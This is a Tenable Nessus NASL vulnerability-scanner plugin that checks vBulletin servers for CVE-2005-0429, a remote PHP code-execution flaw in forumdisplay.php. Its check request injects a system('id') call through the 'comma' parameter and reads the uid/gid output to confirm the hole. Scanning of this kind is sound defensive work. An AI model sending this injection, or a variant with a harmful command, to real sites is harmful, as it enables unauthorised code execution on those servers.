#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(16455);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-0429");
  script_bugtraq_id(12542);

  script_name(english:"vBulletin forumdisplay.php comma Parameter Arbitrary Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows execution of
arbitrary PHP code.");
  script_set_attribute(attribute:"description", value:
"The remote version of vBulletin is vulnerable to a remote command
execution flaw through the script 'forumdisplay.php'.  A malicious
user could exploit this flaw to execute arbitrary commands on the
remote host with the privileges of the web server.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2005/Feb/224");
  script_set_attribute(attribute:"solution", value:
"Upgrade to vBulletin 3.0.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/02/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/02/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:vbulletin:vbulletin");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 Tenable Network Security, Inc.");

  script_dependencies("vbulletin_detect.nasl");
  script_require_keys("www/vBulletin");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

# the code

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/vBulletin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  http_check_remote_code (
			unique_dir:dir,
			check_request: '/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system(\'id\')."',
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
                        warning:TRUE
			);
}
